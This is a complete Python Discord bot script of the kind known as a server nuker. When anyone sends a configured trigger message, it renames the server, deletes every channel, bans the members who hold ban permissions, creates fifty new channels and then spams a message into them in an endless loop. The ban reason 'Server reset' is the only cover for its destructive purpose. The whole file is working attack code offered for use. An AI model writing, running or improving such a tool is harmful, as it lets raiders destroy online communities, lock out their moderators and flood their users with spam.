import discord
import json
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = discord.Client(intents=intents)

# Read config
with open('config.json', encoding='utf-8') as f:
    config = json.load(f)

TOKEN = config['token']
channel_name = config['channel_name']
message_to_send = config['message']
new_server_name = config['server_name']
command = config['command']

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event
async def on_message(message):
    if message.content.strip() == command:
        print("Ping command received!")

        guild = message.guild

        # Change server name
        await guild.edit(name=new_server_name)
        print(f"Server name changed to: {new_server_name}")

        # Del all channels
        await asyncio.gather(*(channel.delete() for channel in guild.channels))
        print("All channels deleted.")

        # Ban all members who can be banned (handling exceptions if no permissions)
        for member in guild.members:
            if member != message.author and member.guild_permissions.ban_members:
                try:
                    await member.ban(reason="Server reset")
                    print(f"Banned {member.name}")
                except discord.errors.Forbidden:
                    print(f"Failed to ban {member.name} due to missing permissions")

        # Create 50 channels in parallel
        async def create_channels():
            tasks = [guild.create_text_channel(channel_name) for _ in range(50)]
            results = []
            for i in range(0, len(tasks), 10):  # Batch requests
                batch = tasks[i:i + 10]
                results.extend(await asyncio.gather(*batch))
                print(f"Created {len(results)} channels so far")
                await asyncio.sleep(0.1)  # Short delay between batches

        await create_channels()
        print("New channels created.")

        # Create a task to send messages repeatedly
        async def send_messages():
            new_channels = [channel for channel in guild.channels if channel.name == channel_name]
            while True:
                await asyncio.gather(
                    *(channel.send(message_to_send) for channel in new_channels)
                )
                await asyncio.sleep(0.1)  # Wait 0.1 seconds after sending messages

        client.loop.create_task(send_messages())
        print("Started sending messages.")

client.run(TOKEN)
